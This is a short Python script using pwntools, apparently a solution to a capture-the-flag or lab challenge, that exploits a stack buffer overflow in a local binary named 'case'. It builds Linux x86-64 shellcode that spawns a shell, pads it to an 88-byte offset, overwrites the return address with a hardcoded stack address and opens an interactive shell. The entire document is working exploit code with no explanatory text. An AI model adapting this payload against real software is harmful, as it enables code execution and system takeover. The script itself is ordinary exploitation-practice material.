from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

shellcode = asm(shellcraft.sh())
assert b'\n' not in shellcode

buf_addr = 0x7fffffffe210
offset   = 88

payload  = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(buf_addr)

p = process('./case')
sleep(0.5)
p.sendline(payload)
p.interactive()
